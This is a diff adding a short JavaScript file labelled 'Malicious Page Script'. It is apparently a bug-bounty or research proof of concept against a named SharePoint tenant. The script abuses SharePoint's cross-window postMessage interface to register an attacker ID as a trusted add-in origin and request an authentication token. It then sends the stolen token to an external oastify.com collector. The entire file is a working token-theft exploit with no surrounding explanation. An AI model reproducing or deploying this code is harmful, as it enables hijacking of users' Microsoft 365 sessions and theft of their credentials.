@@ -1,0 +1,31 @@
+// Malicious Page Script
+const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
+const targetWindow = document.getElementById("sharepoint-frame").contentWindow;
+const exploitId = "HACKER_ID";
+
+// 1. Register Malicious Origin as Trusted
+const registerPayload = JSON.stringify({
+    MessageId: "AddinTrustedOrigin",
+    AddinTrustId: exploitId
+});
+targetWindow.postMessage(registerPayload, targetOrigin);
+
+// 2. Request Auth Token (after short delay)
+setTimeout(() => {
+    const tokenPayload = {
+        MessageId: "GetAuthToken",
+        AddinTrustId: exploitId,
+        Resource: window.location.origin // The attacker's origin vs the registered one
+    };
+    // Send as object and string to cover both parsing cases
+    targetWindow.postMessage(tokenPayload, targetOrigin);
+}, 1000);
+
+// 3. Capture & Exfiltrate Token
+window.addEventListener("message", (event) => {
+    if (event.data && event.data.MessageId === "GetAuthTokenResponse") {
+        const token = event.data.Token;
+        // EXFILTRATION: Send token to your Collaborator
+        fetch('https://cm237ixc7usjxquw38ghh91krbx2ls9h.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
+    }
+});
